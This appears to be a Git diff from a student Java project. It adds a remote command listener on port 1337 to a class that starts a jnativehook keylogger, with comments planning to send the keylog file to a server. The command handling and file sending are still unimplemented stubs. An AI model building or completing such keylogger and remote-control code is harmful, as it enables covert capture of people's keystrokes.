@@ -3,17 +3,24 @@ package edu.wit.comp2100;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
 import java.lang.annotation.Native;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.SocketException;
 import java.nio.file.Path;
 
 public class Bootstrap {
 
     private static final Path DEFAULT_KEYLOG_PATH = null; //TODO decide on default path
     private static final Path DEFAULT_FILE_PATH = null; //TODO reference path where bootstrap is running/stored
-    private File lastReceivedFile;
+    private static File lastReceivedFile;
     private static File keyLogFile;
+
+    //listens for commands from the server like opening a file transfer socket and sending the keylogger
+    private static ServerSocket serverSocket;
+    private static final int LISTENPORT = 1337;
+    private static Socket socket;
 
     /*
     Starts listener thread
@@ -39,15 +46,78 @@ public class Bootstrap {
                 "\n Starting keylogger... ");
 
         startKeylogger(keyLogFile);
+
+        listen();
+
+    }
+
+
+    /*
+    very convoluted method that listens for a command from the server
+
+    will check if socket was closed and reopen if so (since server will
+    be closing and reopening connections on occasion
+     */
+    private static void listen() throws IOException{
+
+        serverSocket = new ServerSocket(LISTENPORT);
+        socket = serverSocket.accept();
+
+        new Thread(){
+
+            public void run(){
+
+                while (true){
+                    try{
+                        if (socket.isClosed()){
+                            try {
+                                socket = serverSocket.accept();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                            System.out.println("Socket reopened and listening");
+                        } else {
+                            try{
+                                //take input from socket indefinitely and output to terminal.
+                                InputStream inputStream = socket.getInputStream();
+                                DataInputStream dataInputStream = new DataInputStream(inputStream);
+
+                                //parse command sent from server
+                                String sentence = dataInputStream.readUTF();
+                                parseCommand(sentence);
+
+                            } catch (EOFException e) {
+                                System.out.println("SYSTEM: Connection closed by client.");
+                                socket.close();
+                            } catch (SocketException s){
+                                System.out.println("SYSTEM: Connection closed.");
+                                socket.close();
+                            } catch (IOException e){
+                                System.out.println("IOEXCEPTION");
+                                socket.close();
+                            }
+                        }
+                    } catch (IOException io){
+                        System.err.println("io exception caused from listener socket");
+                        io.printStackTrace();
+                    }
+                }
+            }
+        }.run();
     }
 
     /*
     Listen invokes this method when it receives a message over the socket
     preforms actions based on arguments
      */
-    private void parseCommand(String[] args){
-
+    private static void parseCommand(String recievedCommand){
         //TODO: implemnt this method
+        //split command into an array of words.
+        //parse command based on array.
+
+        //for now lets just print the command
+        System.out.println(recievedCommand);
+
 
     }
 
@@ -75,21 +145,8 @@ public class Bootstrap {
     /*
     Wrapper method to put received files in pre-defined path
      */
-    private void recieveFile(){
-        recieveFile(DEFAULT_FILE_PATH);
-    }
 
-    /*
-    Receives file from socket and puts it in the defined path
-    uses lastRecievedFile for temporary storage as an object
-     */
-    private void recieveFile(Path filePath){
-        //
-        //        //TODO: implement this method
-
-    }
-
-    private void sendFile(){
+    private void sendFile(String path){
 
     }
 
